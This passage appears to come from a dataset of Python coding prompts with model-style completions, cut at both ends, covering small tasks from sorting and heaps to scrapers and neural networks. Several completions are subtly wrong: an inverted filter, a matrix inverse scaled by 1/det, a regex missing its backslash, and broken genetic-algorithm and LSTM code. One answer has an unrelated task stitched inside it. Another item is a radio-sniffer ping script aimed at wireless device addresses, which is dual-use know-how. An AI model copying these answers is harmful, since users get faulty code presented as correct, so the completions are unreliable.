portfolio_weights = {'Equities': 0.40, 'Bonds': 0.30, 'Real Estate': 0.20, 'Cash': 0.10} target_ratio = {'Equities': 0.35, 'Bonds': 0.30, 'Real Estate': 0.30, 'Cash': 0.05}","completion":"def optimize_portfolio_weights(portfolio_weights, target_ratio): # Create a dictionary to store optimized weights optimized_weights = {} # Iterate over portfolio weights and update them according to the target ratio for asset, weight in portfolio_weights.items(): optimized_weights[asset] = target_ratio.get(asset, weight) return optimized_weights portfolio_weights = {'Equities': 0.40, 'Bonds': 0.30, 'Real Estate': 0.20, 'Cash': 0.10} target_ratio = {'Equities': 0.35, 'Bonds': 0.30, 'Real Estate': 0.30, 'Cash': 0.05} weights = optimize_portfolio_weights(portfolio_weights, target_ratio) print(weights)"},{"prompt":"Create a Python dictionary where the keys are the cities and the values are corresponding population densities. Lahore: 3,883 Karachi: 8,130 Islamabad: 2,572","completion":"cities_populations = { \\"Lahore\\": 3,883, \\"Karachi\\": 8,130, \\"Islamabad\\": 2,572 }"},{"prompt":"This code handles alternate character sets for character strings. To use it, call the \`decode\` function with a \`DataElement\` instance containing a value to convert and the value of Specific Character Set (0008,0005), which may be a single value, a multiple value (code extension), or may also be '' or None. If blank or None, ISO_IR 6 is used. The function will apply the DICOM character encoding to the data element. If the data element is of VR PN, it will handle the special case where it may have 3 components with different character sets. If the data element is of VR in text_VRs, it will remove the first encoding if this is a multibyte encoding and decode the string value to unicode.","completion":"# charset.py \\"\\"\\"Handle alternate character sets for character strings.\\"\\"\\" # # Copyright (c) 2008-2012 Darcy Mason # This file is part of pydicom, released under a modified MIT license. # See the file license.txt included with this distribution, also # available at https://github.com/darcymason/pydicom # from pydicom import compat from pydicom.config import logger from pydicom.valuerep import PersonNameUnicode, text_VRs from pydicom.compat import in_py2 # Map DICOM Specific Character Set to python equivalent python_encoding = { '': 'iso8859', # default character set for DICOM 'ISO_IR 6': 'iso8859', # alias for latin_1 too 'ISO_IR 100': 'latin_1', 'ISO_IR 101': 'iso8859_2', 'ISO_IR 109': 'iso8859_3', 'ISO_IR 110': 'iso8859_4', 'ISO_IR 126': 'iso_ir_126', # Greek 'ISO_IR 127': 'iso_ir_127', # Arab 'ISO_IR 138': 'iso_ir_138', # Hebrew 'ISO_IR 144': 'iso_ir_144', # Russian 'ISO_IR 148': 'iso8859_5', # Thai 'ISO_IR 166': 'XXXXX', No idea what this maps too 'ISO 2022 IR 6': 'iso8859', # alias for latin_1 too 'ISO 2022 IR 13': 'shift_jis', 'ISO 2022 IR 87': 'iso2022_jp', 'ISO 2022 IR 100': 'latin_1', 'ISO 2022 IR 101': 'iso8859_2', 'ISO 2022 IR 109': 'iso8859_3', 'ISO 2022 IR 110': 'iso8859_4', 'ISO 2022 IR 126': 'iso_ir_126', 'ISO 2022 IR 127': 'iso_ir_127', # Arab 'ISO 2022 IR 138': 'iso_ir_138', 'ISO 2022 IR 144': 'iso_ir_144', 'ISO 2022 IR 148': 'iso8859_5', 'ISO 2022 IR 149': 'euc_kr', # needs cleanup via clean_escseq() # Japanesse 'ISO 2022 IR 159': 'XXXX', 'ISO_IR 192': 'UTF8', # from Chinese example, 2008 PS3.5 Annex J p1-4 'GB18030': 'GB18030', } default_encoding = \\"iso8859\\" def clean_escseq(element, encodings): \\"\\"\\"Remove escape sequences that Python does not remove from Korean encoding ISO 2022 IR 149 due to the G1 code element. \\"\\"\\" if 'euc_kr' in encodings: return element.replace( \\"x1bx24x29x43\\", \\"\\").replace(\\"x1bx28x42\\", \\"\\") else: return element # DICOM PS3.5-2008 6.1.1 (p 18) says: # default is ISO-IR 6 G0, equiv to common chr set of ISO 8859 (PS3.5 6.1.2.1) # (0008,0005) value 1 can *replace* the default encoding... # for VRs of SH, LO, ST, LT, PN and UT (PS3.5 6.1.2.3)... # with a single-byte character encoding # if (0008,0005) is multi-valued, then value 1 (or default if blank)... # is used until code extension escape sequence is hit, # which can be at start of string, or after CR/LF, FF, or # in Person Name PN, after ^ or = # NOTE also that 7.5.3 SEQUENCE INHERITANCE states that if (0008,0005) # is not present in a sequence item then it is inherited from its parent. def convert_encodings(encodings): \\"\\"\\"Converts DICOM encodings into corresponding python encodings\\"\\"\\" # If a list if passed, we don't want to modify the list in place so copy it encodings = encodings[:] if isinstance(encodings, compat.string_types): encodings = [encodings] elif not encodings[0]: encodings[0] = 'ISO_IR 6' try: encodings = [python_encoding[x] for x in encodings] except KeyError: # Assume that it is already the python encoding (is there a way to check this?) pass if len(encodings) == 1: encodings = [encodings[0]] * 3 elif len(encodings) == 2: encodings.append(encodings[1]) return encodings def decode(data_element, dicom_character_set): \\"\\"\\"Apply the DICOM character encoding to the data element data_element -- DataElement instance containing a value to convert dicom_character_set -- the value of Specific Character Set (0008,0005), which may be a single value, a multiple value (code extension), or may also be '' or None. If blank or None, ISO_IR 6 is used. \\"\\"\\" if not dicom_character_set: dicom_character_set = ['ISO_IR 6'] encodings = convert_encodings(dicom_character_set) # decode the string value to unicode # PN is special case as may have 3 components with differenct chr sets if data_element.VR == \\"PN\\": # logger.warn(\\"%s ... type: %s\\" %(str(data_element), type(data_element.VR))) if not in_py2: if data_element.VM == 1: data_element.value = data_element.value.decode(encodings) else: data_element.value = [val.decode(encodings) for val in data_element.value] else: if data_element.VM == 1: data_element.value = PersonNameUnicode(data_element.value, encodings) else: data_element.value = [PersonNameUnicode(value, encodings) for value in data_element.value] if data_element.VR in text_VRs: # Remove the first encoding if this is a multi-byte encoding if len(encodings) > 1: del encodings[0] # You can't re-decode unicode (string literals in py3) if data_element.VM == 1: if isinstance(data_element.value, compat.text_type): return data_element.value = clean_escseq( data_element.value.decode(encodings[0]), encodings) else: output = list() for value in data_element.value: if isinstance(value, compat.text_type): output.append(value) else: output.append(clean_escseq(value.decode(encodings[0]), encodings)) data_element.value = output"},{"prompt":"Write a Python program to specify the order of element when given an array and a number. arr=[1,2,3,4], k=3","completion":"def order_elements(arr, k): k_arr = [] j_arr = [] for i in arr: if i <= k: k_arr.append(i) else: j_arr.append(i) k_arr.extend(j_arr) return k_arr"},{"prompt":"Create a Python program to sort a list of dictionaries by the value of the keyvalue pair. data = [{ 'name': 'Sam', 'age': 30 }, { 'name': 'Alex', 'age': 25 }, { 'name': 'John', 'age': 28 }]","completion":"data = [{ 'name': 'Sam', 'age': 30 }, { 'name': 'Alex', 'age': 25 }, { 'name': 'John', 'age': 28 }] def sort_list_dictionaries(data): return sorted(data, key=lambda k: k['age']) print(sort_list_dictionaries(data)) # Outputs: [{'name': 'Alex', 'age': 25}, {'name': 'John', 'age': 28}, {'name': 'Sam', 'age': 30}]"},{"prompt":"Construct a Python list comprehension to generate a 3x3 matrix filled with integers from 1 to 9.","completion":"matrix = [[i+(3*j) for i in range(1,4)] for j in range(3)]"},{"prompt":"Create a webscraping program to extract data from twitter.","completion":"\\"\\"\\" Create a web scraping program to extract data from twitter. \\"\\"\\" from bs4 import BeautifulSoup import requests def scrape_data(): url = 'https://twitter.com/search?q=%23python' response = requests.get(url) html = response.text soup = BeautifulSoup(html, 'html.parser') tweets = soup.find_all('p', {'class': 'TweetTextSize'}) for tweet in tweets: print(tweet.text) if __name__ == \\"__main__\\": scrape_data()"},{"prompt":"Write a machine learning model in Python for predicting if a customer will buy a product based on customer data. The dataset contains 15000 records of a customer's purchase history with features such as age gender, purchase frequency, product type, and product category.","completion":"import pandas as pd import numpy as np # Load data data = pd.read_csv('customer_data.csv') # Create input features X = np.array(data[['age', 'gender', 'purchase_freq', 'product_type', 'product_category']]) # Create output labels y = np.array(data['bought']) # Split into Train/Test Sets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0) # Create and fit model from sklearn.tree import DecisionTreeClassifier classif = DecisionTreeClassifier() classif.fit(X_train, y_train) # Evaluate model y_pred = classif.predict(X_test) score = classif.score(X_test, y_test) print(\\"Accuracy: \\", score)"},{"prompt":"Generate a Python program to implement a MinHeap data structure.","completion":"class MinHeap: def __init__(self): self.heap_array = [] def parent(self, i): return (i - 1) // 2 def insert(self, key): self.heap_array.append(key) # Fix the min heap property if it is violated self.heapify_up(len(self.heap_array) - 1) def heapify_up(self, index): # If current node is greater than parent, then swap if index > 0 and self.heap_array[self.parent(index)] > self.heap_array[index]: # Swap the current node with its parent self.heap_array[index], self.heap_array[self.parent(index)] = ( self.heap_array[self.parent(index)], self.heap_array[index], ) # Heapify the parent node self.heapify_up(self.parent(index)) def delete_min(self): if self.heap_array: deletemin = self.heap_array[0] # Replace the root with the last node self.heap_array[0] = self.heap_array[-1] del self.heap_array[-1] # Heapify the root node self.heapify_down(0) return deletemin def heapify_down(self, index): index_left = 2 * index + 1 index_right = 2 * index + 2 index_smallest = index # If left child is smaller than root if ( index_left < len(self.heap_array) and self.heap_array[index_left] < self.heap_array[index] ): index_smallest = index_left # If right child is smaller than smallest so far if ( index_right < len(self.heap_array) and self.heap_array[index_right] < self.heap_array[index_smallest] ): index_smallest = index_right # If index is not the smallest if index != index_smallest: # Swap with the smallest self.heap_array[index], self.heap_array[index_smallest] = ( self.heap_array[index_smallest], self.heap_array[index], ) # Heapify the index that was swapped self.heapify_down(index_smallest)"},{"prompt":"Write a function in Python to convert following input into a dictionary [(a, 1), (b, 2), (c, 3)]","completion":"def list_to_dict(input_list): output_dict = {} for key, value in input_list: output_dict[key] = value return output_dict"},{"prompt":"Write a Python program that takes a string and counts the number of occurrences of each letter, and then prints the results. Hello World!","completion":"str = \\"Hello World!\\" chars = list(str) # initialize counts as empty dictionary char_counts = {} for char in chars: if char in char_counts: char_counts[char] += 1 else: char_counts[char] = 1 # printing result for char, count in char_counts.items(): print(\\"{} : {}\\".format(char, count))"},{"prompt":"Create a Python program to convert a list of values from Celsius to Fahrenheit. [0, 10, 20]","completion":"\\"\\"\\" Create a Python program to convert a list of values from Celsius to Fahrenheit \\"\\"\\" def celsiusToFahrenheit(celsius_list): fahrenheit_list = [] for celsius in celsius_list: fahrenheit = celsius * 9/5 + 32 fahrenheit_list.append(fahrenheit) return fahrenheit_list if __name__ == '__main__': celsius_list = [0, 10, 20] fahrenheit_list = celsiusToFahrenheit(celsius_list) print(fahrenheit_list)"},{"prompt":"Generate a function in Python that checks if an entered number is even or odd and returns a string with the type.","completion":"def check_type(num): if num % 2 == 0: return 'even' else: return 'odd'"},{"prompt":"Create a Python program to find the sum of all the multiples of 3 and 5 below 1000.","completion":"total = 0 for i in range(1000): if i % 3 == 0 or i % 5 == 0: total += i print(total)"},{"prompt":"Create a Python class that implements a Linked List structure.","completion":"class Node: def __init__(self, data): self.data = data self.next = None class LinkedList: def __init__(self): self.head = None def insert(self, new_node): temp = self.head if temp is None: self.head = new_node return while temp.next is not None: temp = temp.next temp.next = new_node # 5. Instruction: Given a list of integers, write a Python program to find the longest increasing sub-sequence from the given list. 5. Input: [2, 3, 4, 5, 6, 1, 7, 8] 5. Output: def longestIncreasingSubsequence(arr): n = len(arr) lis = [1]*n for i in range (1 , n): for j in range(0 , i): if arr[i] > arr[j] and lis[i]< lis[j] + 1 : lis[i] = lis[j]+1 maximum = 0 for i in range(n): maximum = max(maximum , lis[i]) return maximum arr = [2, 3, 4, 5, 6, 1, 7, 8] print(\\"Length of Longest Increasing Subsequence is\\", longestIncreasingSubsequence(arr))"},{"prompt":"Using a Python program, generate a random password of 8 characters, where at least one character is a uppercase letter and one character is a number.","completion":"import string import random def generate_password(): chars = string.ascii_lowercase + string.ascii_uppercase + string.digits size = 8 while True: password = ''.join(random.choice(chars) for _ in range(size)) if any(c.islower() for c in password) and any(c.isupper() for c in password) and any(c.isdigit() for c in password): break return password print(generate_password())"},{"prompt":"Create a class Fraction in Python which performs basic mathematical operations on two fractions provided as input.","completion":"class Fraction: def __init__(self, numerator, denominator): self.numerator = numerator self.denominator = denominator def __add__(self, obj2): n = self.numerator * obj2.denominator + obj2.numerator * self.denominator d = self.denominator * obj2.denominator return Fraction(n, d) def __sub__(self, obj2): n = self.numerator * obj2.denominator - obj2.numerator * self.denominator d = self.denominator * obj2.denominator return Fraction(n, d) def __mul__(self, obj2): n = self.numerator * obj2.numerator d = self.denominator * obj2.denominator return Fraction(n, d) def __truediv__(self, obj2): n = self.numerator * obj2.denominator d = self.denominator * obj2.numerator return Fraction(n, d) def simplify_fraction(self): i = 2 while i <= self.numerator: if self.numerator % i == 0 and self.denominator % i == 0: self.numerator = self.numerator / i self.denominator = self.denominator / i else: i += 1"},{"prompt":"Given a list of names, write a program in Python to create a new list with the first letter in each name capitalized. names = [kevin, david, james, george]","completion":"def capitalized_list(names): new_list = [] for name in names: new_list.append(name.capitalize()) return new_list print(capitalized_list(names)) # Output ['Kevin', 'David', 'James', 'George']"},{"prompt":"Design a Python script to generate a report containing summaries of the data in a table. Table name: order","completion":"import pandas as pd # Load data from the orders table orders = pd.read_csv('orders.csv') # Generate summary statistics for the orders table summary_stats = orders.describe() # Generate a report containing summary statistics report = open('report.html', 'w') report.write(summary_stats.to_html()) report.close()"},{"prompt":"Write a python class to represent a circle","completion":"class Circle: def __init__(self, radius): self.radius = radius def area(self): return 3.14 * (self.radius ** 2) def circumference(self): return 2 * 3.14 * self.radius circle1 = Circle(10) print(circle1.area()) print(circle1.circumference())"},{"prompt":"Create a web scraper in Python to scrape the top 10 products from a bike parts website.","completion":"#import libraries import requests from bs4 import BeautifulSoup #specify the url and fetch the data from the server url = 'https://examplewebsite.com/' page = requests.get(url) #parse the html content soup = BeautifulSoup(page.content, 'html.parser') #get all the product listings listings = soup.find_all('div', class_='listing') #iterate over each of the product listings for listing in listings[:10]: title = listing.find('h2').text price = listing.find('span', class_='price').text print('{} - {}'.format(title, price))"},{"prompt":"Write a Python code snippet to filter out elements from a given list lst where the element is not greater than 5. [3, 7, 2, 4, 6, 8]","completion":"filtered_lst = [x for x in lst if x <= 5]"},{"prompt":"Write a Python script to check if the given string is a palindrome. string_to_test = racecar","completion":"def is_palindrome(string_to_test): reverse = reversed(string_to_test) if list(string_to_test) == list(reverse): return True return False"},{"prompt":"Create a Python program to generate all the possible permutations of a given array. [1, 2, 3]","completion":"def permutations(arr): if len(arr) == 0: return [] if len(arr) == 1: return [arr] l = [] for i in range(len(arr)): m = arr[i] remLst = arr[:i] + arr[i+1:] for p in permutations(remLst): l.append([m] + p) return l"},{"prompt":"Python Script to normalize a list of numbers. [1, 0.2, 5.66, 2.344, 0]","completion":"def normalize(numbers): min_num = min(numbers) max_num = max(numbers) for i in range(0, len(numbers)): numbers[i] = (numbers[i] - min_num) / (max_num - min_num) return numbers print(normalize([-1, 0.2, 5.66, -2.344, 0]))"},{"prompt":"You need to optimise a given Python code, which takes a 3x3 matrix as input and outputs the inverse. import numpy as np def inverse_matrix(matrix): return np.linalg.inv(matrix)","completion":"import numpy as np def inverse_matrix(matrix): det = np.linalg.det(matrix) if det == 0: return None return np.dot(np.linalg.inv(matrix), 1/det)"},{"prompt":"Optimize a Python code for extracting a string pattern from a list of strings. Not applicable","completion":"import re strings = ['abc123', '456def', '7890ghi'] pattern = 'd+' matches = [] for string in strings: match = re.search(pattern, string) matches.append(match.group(0)) print(matches) # ['123', '456', '7890'] # Optimized version import re strings = ['abc123', '456def', '7890ghi'] matches = [re.search(r'd+', string).group(0) for string in strings] print(matches) # ['123', '456', '7890']"},{"prompt":"Generate a Python program to predict how long a customer will stay with a company. Predict the customer retention after 6 months of joining.","completion":"from sklearn import linear_model import pandas as pd # Define the model model = linear_model.LinearRegression() # Load the data data = pd.read_csv('customer_data.csv') # Fit the data X = data[['age', 'location', 'membership']] y = data['retention'] model.fit(X, y) # Predict the customer retention after 6 months predict = model.predict([[6, 'London', 'Premium']]) print(predict)"},{"prompt":"mplement a genetic algorithm in Python for optimizing a given function that returns a numeric value. Not applicable","completion":"import random def function(x): # replace this with your function return x + 2 def genetic_algorithm(population, pop_size, fit_threshold, max_generations): # initialize population current_gen = init_population(population, pop_size) # evaluate population fitness_scores = get_fitness_scores(current_gen) # loop until termination condition is met for generation in range(max_generations): # select parents parents = tournament_selection(current_gen, fitness_scores) # crossover children = crossover(parents) # mutate mutated_children = mutate(children) # evaluate new population fitness_scores = get_fitness_scores(mutated_children) # select survivors current_gen = select_survivors(mutated_children, fitness_scores) # check fitness threshold if max(fitness_scores) > fit_threshold: break best_individual = current_gen[fitness_scores.index(max(fitness_scores))] return best_individual, max(fitness_scores) def init_population(population, pop_size): # initialize population with random individuals # population should contain individuals that are valid solutions of function return [population[random.randint(0, len(population)-1)] for _ in range(pop_size)] def get_fitness_scores(population): # evaluate each individual and return their fitness scores return [function(individual) for individual in population] def tournament_selection(population, fitness_scores): # select parents through tournament selection # tournament size should be half of population # winners are selected based on the greatest fitness score return [population[fitness_scores.index(max(random.sample(fitness_scores, len(population) // 2)))] for _ in range(len(population) // 2)] def crossover(parents): # crossover parents to generate children return [random.choice(parent1 + parent2) for parent1, parent2 in zip(parents[::2], parents[1::2])] def mutate(children): # mutate each child with a given probability return [child[random.randint(0, len(child)-1) + 1] for child in children] def select_survivors(population, fitness_scores): # select survivors with elitist selection strategy # only the fittest individual survives return [population[fitness_scores.index(max(fitness_scores))]]"},{"prompt":"Write a Python program to separate a specified string into characters and numbers. str = ab12cd3","completion":"def separate_charnum(str): chars = [] nums = [] for char in str: if char.isalpha(): chars.append(char) else: nums.append(int(char)) return chars, nums str = \\"ab12cd3\\" chars, nums = separate_charnum(str) print(chars) print(nums)"},{"prompt":"Convert the following java program to python. public class Main { public static void main(String[] args) { int number = 10; int square = number * number; System.out.println(Square of given number is: +square); } }","completion":"# Converting from Java to Python number = 10 square = number * number print(\\"Square of given number is: \\"+str(square))"},{"prompt":"Create a Python script to calculate the median of an array of integers. [3, 1, 4, 5, 2]","completion":"def median(arr): # Sort the array arr.sort() n = len(arr) # If number of elements is odd, # return the middle element if n % 2 != 0: return arr[n//2] # If number of elements is even, # return the average of the middle # two elements else: return (arr[n//2] + arr[(n//2)-1]) / 2 # Driver code arr = [3, 1, 4, 5, 2] print(median(arr))"},{"prompt":"Generate a random alphanumeric string of 20 characters in length in Python. Not applicable","completion":"import string import random def generate_random_string(): chars = string.ascii_letters + string.digits random_string = ''.join(random.choice(chars) for _ in range(20)) return random_string random_string = generate_random_string() print(random_string) // \\"xVUqrHZkXDjzXFVfBmO7\\""},{"prompt":"Design a Python program to check if a given string has balanced parenthesis.","completion":"def is_balanced(string): stack = [] for char in string: if char == '(': stack.append(char) elif char == ')': if len(stack)==0: return False stack.pop() if len(stack) == 0: return True else: return False"},{"prompt":"Generate a Python program to generate a random password of length 8 that contains at least one of each type of characters: uppercase alphabets, lowercase alphabets and special symbols.","completion":"import random def generate_password(): alphabet = \\"abcdefghijklmnopqrstuvwxyz\\" size = 8 password = \\"\\" for i in range(size): if i%3 == 0: password += chr(random.randint(33,47)) elif i%3 == 1: password += chr(random.randint(65,90)) elif i%3 == 2: password += alphabet[random.randint(0,len(alphabet)-1)] return password"},{"prompt":"Create a RESTful API in Python that exposes a content to be consumed by other applications.","completion":"from flask import Flask, jsonify app = Flask(__name__) @app.route('/content', methods=['GET']) def get_content(): content = {'data': 'This is the content that will be exposed.'} return jsonify(content) if __name__ == \\"__main__\\": app.run()"},{"prompt":"Develop an algorithm in Python for merging k sorted arrays. arrays = [ [1, 3, 5], [2, 4, 6], [7, 8, 9] ]","completion":"def mergeKArrays(arrays): ''' This function will merge k sorted arrays in to one sorted array. ''' # initialize the resulting array result = [] # loop through all the arrays for array in arrays: # merge this array with existing result result = mergeTwoArrays(result, array) # return the result array return result def mergeTwoArrays(arr1, arr2): # define the resulting array result = [] i, j = 0, 0 # loop through both the arrays while i < len(arr1) and j < len(arr2): if arr1[i] < arr2[j]: result.append(arr1[i]) i += 1 else: result.append(arr2[j]) j += 1 # add the remaining elements from both arrays result.extend(arr1[i:]) result.extend(arr2[j:]) return result arrays = [[1, 3, 5], [2, 4, 6], [7, 8, 9]] print(mergeKArrays(arrays)) # [1, 2, 3, 4, 5, 6, 7, 8, 9]"},{"prompt":"Use a Python function to determine the maximum of three given numbers.","completion":"def maxOfThree(a, b, c): return max(a, b, c)"},{"prompt":"Write a Python script that takes two numbers as input and raises the first number to the power of the second number. 2, 5","completion":"def power_function(a, b): return a**b a = int(input(\\"Enter the first number: \\")) b = int(input(\\"Enter the second number: \\")) result = power_function(a, b) print(\\"The result is:\\", result)"},{"prompt":"Create a Python program that takes in a list and returns a new list. The program should subtract 10 from every element in the list. list = [1,2,3,4,5]","completion":"def subtractFromList(list): return [x - 10 for x in list]"},{"prompt":"Generate a Python program to add new elements to an existing tuple. oldTuple = (1, 2, 3) newElements = (4, 5, 6)","completion":"# create a new tuple adding the elements from the old tuple and the new elements newTuple = oldTuple + newElements"},{"prompt":"Using SWIG, create a C++ library that can be used in Python. This library should include a function for calculating the mean of an array of numbers. Not applicable","completion":"// File mean.cpp #include <iostream> #include <vector> double mean(std::vector<double> vals) { double result = 0; for (int i = 0; i < vals.size(); i++) result += vals[i]; return result / vals.size(); } // File mean.i %module mean %{ #define SWIG_FILE_WITH_INIT #include \\"mean.cpp\\" %} %include \\"arrays_cw.i\\" %include \\"mean.cpp\\" // File setup.py from distutils.core import setup, Extension example_module = Extension('_mean', sources=['mean_wrap.cxx', 'mean.cpp'],) setup (name = 'mean', version = '0.1', author = \\"SWIG\\", description = \\"\\"\\"Simple swig example from docs\\"\\"\\", ext_modules = [example_module], py_modules = [\\"mean\\"], ) // File mean_wrap.cxx #include \\"mean.h\\" #ifdef __cplusplus extern \\"C\\" { #endif double mean(double *vals, int n) { std::vector<double> v; for (int i=0; i<n; i++) v.push_back(vals[i]); return mean(v); } #ifdef __cplusplus } #endif"},{"prompt":"Create a Python class called Home that has name, location and price parameters. Allow a user to instantiate this class and print the location and price. name = My Home location = New York price = 500,000","completion":"class Home: def __init__(self, name, location, price): self.name = name self.location = location self.price = price def print_location_and_price(self): print(\\"Location: \\" + self.location + \\", Price: \\" + self.price) home = Home(\\"My Home\\", \\"New York\\", \\"500,000\\") home.print_location_and_price()"},{"prompt":"Generate a Python script which takes an integer as an argument and prints out the Fibonacci sequence upto the given integer. Integer: 10","completion":"def fibonacci(n): a, b = 0, 1 for _ in range(n): a, b = b, a+b return a for i in range(1, 11): fib = fibonacci(i) print(fib)"},{"prompt":"Generate a code that creates a new python class which inherits attributes and methods from the base class. Base class name: Employee Subclass name: Manager","completion":"class Manager(Employee): \\"\\"\\"A manager class that inherits from the employee class.\\"\\"\\" def __init__(self, name, age, salary, designation): \\"\\"\\"Initialize the manager class with the inherited attributes from the Employee class\\"\\"\\" super().__init__(name, age, salary) self.designation = designation def give_raise(self, amount): \\"\\"\\"Give the manager a raise equivalent to the amount specified\\"\\"\\" self.salary += amount"},{"prompt":"Optimize the python code below for memory efficiency. my_list = [] for i in range(20): my_list.append(i**2)","completion":"my_list = [i**2 for i in range(20)]"},{"prompt":"Create a python program to check if the value entered is a prime number","completion":"def is_prime(n): # edge cases if n == 1 or n < 0: return False # check if number is divisible by any number # from 2 to n for i in range(2, n): if (n % i) == 0: return False return True x = 5 if is_prime(x): print(x, \\"is a prime number\\") else: print(x, \\"is not a prime number\\")"},{"prompt":"To measure the successful pings per second using this script, follow these steps: 1. Run the script using the command sudo python ping.py l a 61:8E:9C:CD:03 f 74 t 0 r 0. 2. Enter the address to sniff with the a or address argument, followed by the RF channel with the f or channel argument. 3. The script will put the radio in sniffer mode and set the channel. 4. The script will display the maximum and current rate of successful pings per second on the console. 5. To stop the script, press Ctrl+C.","completion":"#!/usr/bin/env python2 ''' Author: xswxm Blog: xswxm.com This script will measure the successful pings per seconds. e.g.: sudo python ping.py -l -a 61:8E:9C:CD:03 -f 74 -t 0 -r 0 ''' import sys, time, threading from lib import common common.init_args('./ping.py') common.parser.add_argument('-a', '--address', type=str, help='Address to sniff, following as it changes channels', required=True) common.parser.add_argument('-f', '--channel', type=int, help='RF channel', default=0) common.parse_and_init() channel = common.args.channel # Total number of payloads sent count = 0 # Parse the prefix address address = common.args.address.replace(':', '').decode('hex')[::-1][:5] # Put the radio in sniffer mode (ESB w/o auto ACKs) common.radio.enter_sniffer_mode(address) # Set channel common.radio.set_channel(channel) stop_event = threading.Event() stop_event.set() # Update per milliseconds def display(): global count, stop_event # To record the number of payloads sent for every 100 milliseconds pings = [0]*10 # Highest rate max_rate = 0 while stop_event.isSet(): pings = pings[1:] + [count] rate = pings[-1] - pings[0] if max_rate < rate: max_rate = rate msg = 'Maximum Rate: {0:>4}pks/s Current Rate: {1:>4}pks/s'.format(max_rate, rate) sys.stdout.write('r'+msg) sys.stdout.flush() time.sleep(0.1) if __name__ == \\"__main__\\": t = threading.Thread(target=display,args=()) t.start() try: while True: if common.radio.transmit_payload(common.ping_payload, common.ack_timeout, common.retries): count += 1 except KeyboardInterrupt: stop_event.clear()"},{"prompt":"Create a program in Python which takes a string and prints out all the words present in the string in alphabetical order. string = This is a test string","completion":"def sortString(string): words = string.split(\\" \\") words.sort() return words print(sortString(string))"},{"prompt":"Design a FOR loop algorithm in Python to print all numbers starting from one to the given number. 10","completion":"for i in range(1, 11): print(i)"},{"prompt":"Generate a Python function that takes an array of integers as input and returns an array of integers with the positive numbers appearing before the negative numbers. [5, 2, 7, 3, 4, 9]","completion":"def sort_positives_negatives(arr): positives = [] negatives = [] for x in arr: if x < 0: negatives.append(x) else: positives.append(x) return positives + negatives result = sort_positives_negatives([-5, 2, 7, -3, 4, 9]) print(result)"},{"prompt":"Write a Python program to create a list that contains the elements of the previous list, but with all duplicates removed. list_with_duplicates = [2, 3, 4, 4, 5, 5, 6, 6]","completion":"no_duplicates_list = list(set(list_with_duplicates))"},{"prompt":"mplement a neural network in Python which takes two inputs and produces a single output. Sample input to the neural network: Input 1: [1, 0, 0] Input 2: [1, 0, 0]","completion":"import numpy as np import matplotlib.pyplot as plt # Training dataset x = np.array([ [1, 0, 0], [1, 0, 1], [1, 1, 0], [1, 1, 1]]) y = np.array([[0],[1],[1],[0]]) # Initialize the weights and bias W1 = np.random.rand(3, 4) W2 = np.random.rand(4, 1) b1 = np.random.rand(4,) b2 = np.random.rand(1,) # Define the sigmoid activation function def sigmoid(x): return 1/(1 + np.exp(-x)) # Define the derivative of the sigmoid function def derivative_sigmoid(x): return sigmoid(x)*(1-sigmoid(x)) # Feedforward h1 = x.dot(W1) + b1 # Hidden layer activation a1 = sigmoid(h1) # Assesment of second layer h2 = a1.dot(W2) + b2 # Final activation output = sigmoid(h2) # Calculate the error error = y - output # Backpropagation d_output = error * derivative_sigmoid(output) error_hidden_layer = d_output.dot(W2.T) d_hidden_layer = error_hidden_layer * derivative_sigmoid(a1) # Update weights and bias W2 += a1.T.dot(d_output) b2 += np.sum(d_output, axis = 0, keepdims=True) W1 += x.T.dot(d_hidden_layer) b1 += np.sum(d_hidden_layer, axis = 0, keepdims=True) # Printed output from our neural network print (output) # Sample input to the neural network Input 1: [1, 0, 0] Input 2: [1, 0, 0] # Printed output [[0.06108959]]"},{"prompt":"Create a function in Python that returns the surface area of a sphere when given the sphere’s radius as input. radius = 6","completion":"import math def sphere_surface_area(radius): surface_area = 4 * math.pi * radius * radius return surface_area # Test radius = 6 print(sphere_surface_area(radius)) # 452.38934211"},{"prompt":"Create an artificial neural network in Python to predict the stock price for a given company. Historical stock price data for the company.","completion":"import numpy as np import pandas as pd import matplotlib.pyplot as plt from sklearn.preprocessing import MinMaxScaler from keras.models import Sequential from keras.layers import LSTM, Dense df = pd.read_csv(input_data) # feature scaling sc = MinMaxScaler(feature_range= (0,1)) df_scaled = sc.fit_transform(df) # split into training and test sets x_train, y_train = df_scaled[:train_len, 3], df_scaled[:train_len, 3] x_test, y_test = df_scaled[train_len:, 3], df_scaled[train_len:, 3] # reshape the data x_train = np.reshape(x_train, (x_train.shape[0], 1, x_train.shape[1]) x_test = np.reshape(x_test, (x_test.shape[0], 1, x_test.shape[1]) # build model model = Sequential() model.add(LSTM(50, return_sequences=True)) model.add(LSTM(50, return_sequences=False)) model.add(Dense(1)) model.compile(loss='mean_squared_error', optimizer='adam') # fit model model.fit(x_train, y_train, batch_size=1, epochs=1) # make prediction predicted_stock_price = model.predict(x_test) predicted_stock_price = sc.inverse_transform(predicted_stock_price) # visualize the result plt.plot(real_stock_price, color = 'red', label = 'Real Stock Price') plt.plot(predicted_stock_price, color = 'blue', label = 'Predicted Stock Price') plt.title('Stock Price Prediction') plt.xlabel('Time') plt.ylabel('Stock Price') plt.legend() plt.show()"},{"prompt":"Suggest a completion for the following Python code snippet that implements a linear search on an array. def linear_search(arr, target): for i in range(len(arr))","completion":"def linear_search(arr, target): for i in range(len(arr)): if (arr[i] == target): return i return -1"},{"prompt":"Write a python program to classify the given sentence as positive or negative This machine learning project is quite difficult.","completion":"def classify_sentiment(sentence): words = sentence.split() positive_words = [\\"good\\", \\"great\\", \\"excellent\\", \\"wonderful\\"] negative_words = [\\"bad\\", \\"horrible\\", \\"terrible\\", \\"awful\\"] pos_count, neg_count = 0, 0 for word in words: if word in positive_words: pos_count += 1 if word in negative_words: neg_count += 1 if pos_count > neg_count: sentiment = \\"positive\\" elif neg_count > pos_count: sentiment = \\"negative\\" else: sentiment = \\"neutral\\" return sentiment"},{"prompt":"Generate a Python dictionary where the keys are states and the values are their capitals.","completion":"state_capitals = { 'Alabama': 'Montgomery', 'Alaska': 'Juneau', 'Arizona': 'Phoenix', 'Arkansas': 'Little Rock', 'California': 'Sacramento', 'Colorado': 'Denver', 'Connecticut': 'Hartford', 'Delaware': 'Dover', 'Florida': 'Tallahassee', 'Georgia': 'Atlanta', 'Hawaii': 'Honolulu', 'Idaho': 'Boise', 'Illinois': 'Springfield', 'Indiana': 'Indianapolis', 'Iowa': 'Des Moines', 'Kansas': 'Topeka', 